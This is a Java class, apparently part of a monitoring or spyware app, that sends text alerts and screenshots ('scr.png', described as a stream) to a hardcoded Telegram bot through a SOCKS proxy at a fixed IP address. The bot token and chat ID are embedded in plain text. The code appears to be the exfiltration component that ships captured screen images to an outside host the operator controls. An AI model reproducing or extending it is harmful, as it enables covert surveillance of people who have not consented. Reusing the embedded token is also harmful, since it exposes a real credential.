package com.tom5.monitor;

import okhttp3.*;
import java.io.File;
import java.net.InetSocketAddress;
import java.net.Proxy;

public class TelegramSender {
    private static final String TOKEN = "8254504974:AAEK4l6tyoFPOOaPN73A10Txf5Yq9Z5PlzY"; // حط توكنك هنا
    private static final String CHAT_ID = "7259620384"; // حط ايديك هنا

    // دالة إرسال رسالة نصية (للتبيه)
    public static void sendMessage(String text) {
        new Thread(() -> {
            try {
                Proxy proxy = new Proxy(Proxy.Type.SOCKS, new InetSocketAddress("64.225.8.135", 1080));
                OkHttpClient client = new OkHttpClient.Builder().proxy(proxy).build();

                FormBody body = new FormBody.Builder()
                        .add("chat_id", CHAT_ID)
                        .add("text", text)
                        .build();

                Request request = new Request.Builder()
                        .url("https://api.telegram.org/bot" + TOKEN + "/sendMessage")
                        .post(body)
                        .build();
                client.newCall(request).execute();
            } catch (Exception e) { e.printStackTrace(); }
        }).start();
    }

    // دالة إرسال الصور (البث)
    public static void sendPhoto(File file) {
        new Thread(() -> {
            try {
                Proxy proxy = new Proxy(Proxy.Type.SOCKS, new InetSocketAddress("64.225.8.135", 1080));
                OkHttpClient client = new OkHttpClient.Builder().proxy(proxy).build();

                RequestBody body = new MultipartBody.Builder().setType(MultipartBody.FORM)
                        .addFormDataPart("chat_id", CHAT_ID)
                        .addFormDataPart("photo", "scr.png", RequestBody.create(MediaType.parse("image/png"), file))
                        .build();

                Request request = new Request.Builder()
                        .url("https://api.telegram.org/bot" + TOKEN + "/sendPhoto")
                        .post(body)
                        .build();
                client.newCall(request).execute();
            } catch (Exception e) { e.printStackTrace(); }
        }).start();
    }
}
